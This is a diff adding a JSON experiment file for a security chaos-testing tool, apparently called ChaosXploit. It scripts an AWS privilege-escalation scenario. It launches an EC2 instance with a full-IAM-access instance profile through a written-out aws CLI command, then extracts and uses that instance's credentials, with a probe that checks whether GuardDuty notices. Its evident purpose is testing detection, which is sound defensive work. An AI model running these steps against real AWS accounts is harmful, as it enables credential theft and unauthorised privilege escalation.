@@ -1,0 +1,60 @@
+{
+    "title": "Privelege Scalation",
+    "description": "A set of policies misconfigured that allows an attacker to launch a new EC2 instance passing an existing EC2 profile. ",
+    "steady-state-hypothesis": {
+        "title": "AWS GuardFuty detects the use of an instance profile credentials",
+        "probes": [
+
+            {
+                "type": "probe",
+                "name": "GuarDuty-Findings",
+                "tolerance":true,
+                "provider": {
+                    "type": "python",
+                    "module": "ChaosXploit.Runner.probes.probes_buckets",
+                    "func": "find_changes",
+                    "arguments": {
+                        "input_file":"selected.json"
+                    }
+                }
+                
+            }
+        ]
+    },
+    "method": [
+        {
+            "type": "action",
+            "name": "*******Creating instance*******",
+            "provider": {
+                "type": "process",
+                "path":"aws",
+                "arguments": "ec2 run-instances --image-id ami-02f3f602d23f1659d --instance-type t2.micro --iam-instance-profile Name=iamfullaccess --key-name demo-ec2 --security-group-ids sg-03d1a24ec4f2f11fe"
+                
+            }
+        },
+        {
+            "type": "action",
+            "name": "*******Extracting Credentials*******",
+            "provider": {
+                "type": "python",
+                "module": "ChaosXploit.Runner.actions.actions_ec2",
+                "func": "extract_credentials"
+                
+            }
+        },
+        {
+            "type": "action",
+            "name": "*******Using credentials*******",
+            "provider": {
+                "type": "python",
+                "module": "ChaosXploit.Runner.actions.actions_ec2",
+                "func": "priv_scalation",
+                "arguments":{"keys":"AccessKeys.json"}
+                
+            }
+        }
+    ],
+    "rollbacks": [ 
+
+    ]
+}
